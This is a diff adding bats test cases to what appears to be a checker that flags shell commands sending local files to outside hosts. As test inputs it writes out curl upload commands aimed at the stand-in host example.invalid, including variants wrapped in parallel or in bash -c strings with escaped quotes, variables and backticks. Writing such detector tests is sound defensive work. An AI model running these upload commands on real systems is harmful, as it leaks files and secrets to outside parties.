@@ -157,6 +157,21 @@ allowed() {
   reported "parallel curl -d @{} https://example.invalid/x ::: a.json b.json"
 }
 
+@test "an input of parallel that has a scheme is still read as a URL of the command it runs" {
+  reported "parallel curl -F file=@x {} ::: https://example.invalid/u" \
+    "parallel -j2 curl -d @x {} ::: https://example.invalid/a https://example.invalid/b" \
+    "parallel curl -d @x {} ::: http://127.0.0.1:5183/a https://example.invalid/b"
+  allowed "parallel curl -d @{} http://127.0.0.1:5183/x ::: a.json b.json" \
+    "parallel curl -d @x {} ::: http://127.0.0.1:5183/a http://localhost/b"
+}
+
+@test "a shell string's escaped double quotes are undone when it holds a variable or a backtick too" {
+  reported "bash -c \"echo \\\"it's\\\" \\\$HOME; curl -F f=@x https://example.invalid/u\"" \
+    "bash -c \"echo \\\"it's\\\" \\\`date\\\`; curl -F f=@x https://example.invalid/u\""
+  allowed "bash -c \"echo \\\"it's\\\" \\\$HOME; curl -F f=@x http://127.0.0.1:5183/u\"" \
+    "bash -c \"curl -d @x \\\"\\\$B/u\\\"\""
+}
+
 @test "a literal outside host with a variable only in its path or query is reported" {
   reported "curl -F file=@x \"https://example.invalid/u?t=\$RANDOM\"" "curl -d @x https://example.invalid/u/\$(date +%s)" \
     'curl -d @x https://example.invalid/u/`date +%s`' "curl -d @x \"example.invalid/\$ID\"" \
